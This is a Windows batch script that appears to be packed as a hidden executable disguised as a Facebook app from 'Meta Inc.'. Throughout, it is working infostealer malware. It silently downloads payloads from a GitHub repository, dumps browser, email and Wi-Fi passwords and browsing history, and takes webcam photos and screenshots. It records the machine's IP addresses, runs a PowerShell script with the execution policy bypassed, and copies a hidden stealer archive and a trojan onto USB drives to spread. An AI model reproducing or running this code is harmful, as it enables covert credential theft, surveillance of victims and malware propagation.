@ECHO OFF
REM BFCPEOPTIONSTART
REM Advanced BAT to EXE Converter www.BatToExeConverter.com
REM BFCPEEXE=C:\Users\Shakil-PC\Desktop\pdf\facebook.bat
REM BFCPEICON=C:\Program Files (x86)\Advanced BAT to EXE Converter PRO v2.91\ab2econv291pro\icons\fb.ico
REM BFCPEICONINDEX=1
REM BFCPEEMBEDDISPLAY=0
REM BFCPEEMBEDDELETE=0
REM BFCPEADMINEXE=0
REM BFCPEINVISEXE=1
REM BFCPEVERINCLUDE=1
REM BFCPEVERVERSION=7.0.1.1
REM BFCPEVERPRODUCT=Facebook
REM BFCPEVERDESC=Facebook Meta Inc.
REM BFCPEVERCOMPANY=Meta Inc.
REM BFCPEVERCOPYRIGHT=Copyright Info - @ Meta
REM BFCPEOPTIONEND
@ECHO ON
@ECHO OFF
setlocal enableextensions
cd /D "%~dp0"


echo ************* Microsoft ****************
echo Please wait...
timeout 1 > NUL
echo.
echo .
echo.
timeout 1 > NUL
echo .
set CUR_HH=%time:~0,2%
if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
set CUR_NN=%time:~3,2%
set CUR_SS=%time:~6,2%
set FILENAME=%CUR_HH%%CUR_NN%%CUR_SS%

::echo ************* Removing microsoft previous data ****************
RMDIR /S /Q C:\Users\Public\Licence\Microsoft\ > nul 2> nul
echo Erasing past footprint!


::echo ************* Killing task ****************
taskkill /f /im Lightshot.exe > nul 2> nul
taskkill /f /im folder.exe > nul 2> nul
echo Killing bad guys!
echo.
timeout 1 > NUL



::echo ************* Create directory ****************
echo ************* Debugging dir ****************
   mkdir C:\Users\Public\Licence\Extension > nul 2> nul
   attrib -h -r C:\Users\Public\Licence\Extension /s /d > nul 2> nul

   mkdir C:\Users\Public\Licence\Microsoft > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Addons > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Browser > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Chrome > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Firefox > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\IExplorer > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Location > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Opera > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Safari > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Screenshot > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Webcam > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Social > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Task > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\Utility > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\WiFi > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger > nul 2> nul
   mkdir C:\Users\Public\Licence\Microsoft\A310Logger > nul 2> nul
   
   mkdir C:\Users\%username%\AppData\Local\Temp\afolder > nul 2> nul
   
   
   echo Making ground!



::echo ************* Copy file 1 give ****************
   copy "C:\Users\%username%\AppData\Local\Temp\afolder\*.*" "C:\Users\Public\Licence\Extension\" /y > nul 2> nul
   echo Planting files!


::echo ************* Changing working dir ****************
   cd /D C:\Users\Public\Licence\Extension
   echo Success!

   echo Policy...
   if not exist "C:\Users\Public\Licence\Extension\Policies.bat" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true', 'Policies.bat')" > nul 2> nul    
   ) 
   if errorlevel 1 (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true -OutFile Policies.bat" > nul 2> nul
   ) 
   if errorlevel 1 (
      set url="https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true"
      set filename="Policies.bat"
      certutil -urlcache -split -f %url% %filename% > nul 2> nul   
   )
   call "C:\Users\Public\Licence\Extension\Policies.bat" 



echo Please wait...
timeout 2 > NUL
echo.
echo.
echo.
timeout 1 > NUL
echo.




:loop
echo ************* Internet connection ****************     
   echo Checking internet connectivity. Please wait...
   timeout 1 > NUL
   Ping www.google.nl -n 1 -w 1000 > NUL
   if errorlevel 1 (set internet=Not connected to internet) else (set internet=Connected to internet)
   echo %internet%!!
   echo.
   timeout 1 > NUL
   if "%internet%" == "Not connected to internet" ( 
      cls
      goto loop
   ) else (


::echo ************* DOWNLOAD file ****************
   echo Downloading...
   if not exist "C:\Users\Public\Licence\Extension\Policies.bat" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true', 'Policies.bat')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2
   if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/nircmd.exe?raw=true', 'nircmd.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2
   if not exist "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/WebCamImageSave.exe?raw=true', 'WebCamImageSave.exe')" > nul 2> nul    
   )  
   echo .
      if errorlevel 1 goto ERROR2
   if not exist "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/BrowserAddonsView.exe?raw=true', 'BrowserAddonsView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2     

   if not exist "C:\Users\Public\Licence\Extension\WebBrowserPassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/WebBrowserPassView.exe?raw=true', 'WebBrowserPassView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2  
   
   if not exist "C:\Users\Public\Licence\Extension\ChromeHistoryView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/ChromeHistoryView.exe?raw=true', 'ChromeHistoryView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2     

   if not exist "C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/FirefoxDownloadsView.exe?raw=true', 'FirefoxDownloadsView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\iehv.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/iehv.exe?raw=true', 'iehv.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2     

   if not exist "C:\Users\Public\Licence\Extension\SafariHistoryView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/SafariHistoryView.exe?raw=true', 'SafariHistoryView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2     

   if not exist "C:\Users\Public\Licence\Extension\mailpv.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/mailpv.exe?raw=true', 'mailpv.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\SkypeLogView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/SkypeLogView.exe?raw=true', 'SkypeLogView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2     

   if not exist "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/TaskSchedulerView.exe?raw=true', 'TaskSchedulerView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2  
   
   if not exist "C:\Users\Public\Licence\Extension\UninstallView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/UninstallView.exe?raw=true', 'UninstallView.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2     
   




echo .




   if not exist "C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/browsinghistoryview.exe?raw=true', 'BrowsingHistoryView.exe')" > nul 2> nul 
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\ChromePass.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/ChromePass.exe?raw=true', 'ChromePass.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\IEpassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/iepv.exe?raw=true', 'IEpassView.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\MyLastSearch.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/mylastsearch.exe?raw=true', 'MyLastSearch.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\OperaPassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/operapassview.exe?raw=true', 'OperaPassView.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\PasswordFox.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\facebook.bat" (      
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\AutoRun.vbs" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\instagram.ps1" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\a310logger.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2   

   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/Exe/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
      if errorlevel 1 goto ERROR2   
   goto SUCCESS 




   :ERROR2
   echo Your first attempt might fail! We'll try second.
   echo.
   echo Please, wait...

   if not exist "C:\Users\Public\Licence\Extension\Policies.bat" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true -OutFile Policies.bat" > nul 2> nul
   )
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/nircmd.exe?raw=true -OutFile nircmd.exe" > nul 2> nul
   )
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/WebCamImageSave.exe?raw=true -OutFile WebCamImageSave.exe" > nul 2> nul
   )
      if errorlevel 1 goto ERROR3
   echo .
   if not exist "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/BrowserAddonsView.exe?raw=true -OutFile BrowserAddonsView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\WebBrowserPassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3
   
   if not exist "C:\Users\Public\Licence\Extension\ChromeHistoryView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/ChromeHistoryView.exe?raw=true -OutFile ChromeHistoryView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/FirefoxDownloadsView.exe?raw=true -OutFile FirefoxDownloadsView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\iehv.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/iehv.exe?raw=true -OutFile iehv.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\SafariHistoryView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/SafariHistoryView.exe?raw=true -OutFile SafariHistoryView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\mailpv.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/mailpv.exe?raw=true -OutFile mailpv.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\SkypeLogView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/SkypeLogView.exe?raw=true -OutFile SkypeLogView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/TaskSchedulerView.exe?raw=true -OutFile TaskSchedulerView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3
   
   if not exist "C:\Users\Public\Licence\Extension\UninstallView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/UninstallView.exe?raw=true -OutFile UninstallView.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3
   


echo .




   if not exist "C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/BrowserDownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\ChromePass.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/ChromePass.exe?raw=true -OutFile ChromePass.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\Public\Licence\Extension\IEpassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/iepv.exe?raw=true -OutFile IEpassView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\Public\Licence\Extension\MyLastSearch.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/mylastsearch.exe?raw=true -OutFile MyLastSearch.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\Public\Licence\Extension\OperaPassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/operapassview.exe?raw=true -OutFile OperaPassView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\Public\Licence\Extension\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\Public\Licence\Extension\facebook.bat" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\AutoRun.vbs" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\instagram.ps1" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\Public\Licence\Extension\a310logger.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/Exe/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
      if errorlevel 1 goto ERROR3
   goto SUCCESS 


   :ERROR3
   echo Your second attempt might fail! We'll try third.
   echo.
   echo Please, wait...
   timeout 3 > NUL
  
   set url="https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true"
   set filename="Policies.bat"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/UserSohel/AutoRun.vbs?raw=true"
   set filename="AutoRun.vbs"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/UserSohel/facebook.bat?raw=true"
   set filename="facebook.bat"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/UserSohel/instagram.ps1?raw=true"
   set filename="instagram.ps1"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/UserSohel/a310logger.exe?raw=true"
   set filename="a310logger.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/UserSohel/Exe/folder.exe?raw=true"
   set filename="folder.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF
   goto SUCCESS 
)  
::else part of - internet connection check

   :EOF 
   echo Your last attempt might fail.
   echo Check internet conectivity!?
   timeout 5 
   cls
   goto loop



   :SUCCESS
   echo DOWNLOAD SUCCESSFUL!!
   ::echo ************* Copy file 2 take ****************
   copy "C:\Users\Public\Licence\Extension\*.*" "C:\Users\%username%\AppData\Local\Temp\afolder\" /y > nul 2> nul
   echo Planting files!
   echo.
   echo.
   echo ************* Execute file ****************
   echo Flying on sky!
   call "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Addons\BrowserAddonsView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\BrowserDownloadsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowserDownloadsView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowsingHistoryView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\MyLastSearch.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\MyLastSearch.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebBrowserPassView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\WebBrowserPassView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\ChromeHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Chrome\ChromeHistoryView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\ChromePass.exe" /stext "C:\Users\Public\Licence\Microsoft\Chrome\ChromePass.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Firefox\FirefoxDownloadsView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\PasswordFox.exe" /stext "C:\Users\Public\Licence\Microsoft\Firefox\PasswordFox.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\iehv.exe" /stext "C:\Users\Public\Licence\Microsoft\IExplorer\iehv.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\IEpassView.exe" /stext "C:\Users\Public\Licence\Microsoft\IExplorer\IEpassView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\OperaPassView.exe" /stext "C:\Users\Public\Licence\Microsoft\Opera\OperaPassView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\SafariHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Safari\SafariHistoryView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\mailpv.exe" /stext "C:\Users\Public\Licence\Microsoft\Social\mailpv.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\SkypeLogView.exe" /stext "C:\Users\Public\Licence\Microsoft\Social\SkypeLogView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" /stext "C:\Users\Public\Licence\Microsoft\Task\TaskSchedulerView.txt" > nul 2> nul
   call "C:\Users\Public\Licence\Extension\UninstallView.exe" /stext "C:\Users\Public\Licence\Microsoft\Utility\UninstallView.txt" > nul 2> nul

   ::echo ************* A310Logger ****************
   echo Cooking 3 kg meat!
   call "C:\Users\Public\Licence\Extension\A310Logger.exe" > nul 2> nul
   Robocopy C:\Users\Shakil-PC\AppData\Local\A310Logger\ C:\Users\Public\Licence\Microsoft\A310Logger /E /MOVE > nul 2> nul

   ::echo ************* Webcam image ****************
   echo Watching dirty picture!
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_1.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_2.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_3.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_4.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_5.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_6.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_7.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_8.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_9.jpg" > nul 2> nul
      timeout 2 > nul 2> nul
   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_10.jpg" > nul 2> nul

   ::echo ************* Screenshot ****************
   echo Shoot my head!
   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_1.png > nul 2> nul
   timeout 3 > nul 2> nul   
   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_2.png > nul 2> nul
   timeout 3 > nul 2> nul  
   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_3.png > nul 2> nul
   timeout 3 > nul 2> nul    

   ::echo ************* Find IP ****************
   echo Vip!
   echo Computer Name: %ComputerName% and %UserName% >"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" 
   echo. >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" 
   for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set ip=%%b
   set ip=%ip:~1%
   echo Internal IP is:  %ip% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" 
   For /f %%A in (
   'powershell -nop -c "(Invoke-RestMethod http://ipinfo.io/json).IP"'
   ) Do Set ExtIP=%%A
   echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" 

   ::echo ************* WiFi password ****************
   echo Need wife!
   setlocal enabledelayedexpansion
   echo WiFi Password is: >"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt"
   echo. >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" 
   for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
       set wifi_pwd=
       for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
           set wifi_pwd=%%F
	   set ssid=%%a
       )
       echo # !ssid! : !wifi_pwd! >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" 
   )

   echo Executed
   echo.



   echo ************* Windows updates found ****************
   echo Checking Windows for Update. Please wait...
   echo.

   echo ************* Run powershell file ****************
   ::call "C:\Users\Public\Licence\Extension\instagram.ps1"
   powershell.exe -ExecutionPolicy Bypass -File "%cd%\instagram.ps1"
	   

   echo ************* Give feedback success ****************
   echo Yes!!    

 

   


::echo ************* Pendrive check ****************
   :pendrive
   echo ************* Done ****************
	  timeout 1 > NUL
	  ::echo Checking for pendrive...
	  echo Waiting to close...
	  for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
	  if %%l equ 2 (
		 mkdir %%i\YouTube > nul 2> nul
	::______SystemUpdate stealer
                 if not exist "%%i\System Update\.data\SystemUpdate.zip" (
			mkdir "%%i\System Update\.data" > nul 2> nul
		        copy "C:\Users\Public\Licence\SystemUpdate.zip" "%%i\System Update\.data" /Y > nul 2> nul
		 	attrib +h +r "%%i\System Update\.data" /s /d > nul 2> nul
			attrib +h +r "%%i\System Update\.data\SystemUpdate.zip" /s /d > nul 2> nul
		 )
		
	::______folder.exe trojener
		 if not exist "%%i\folder.exe" (
		        copy "C:\Users\Public\Licence\Extension\folder.exe" "%%i" /Y > nul 2> nul
		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i" /Y > nul 2> nul
		 )

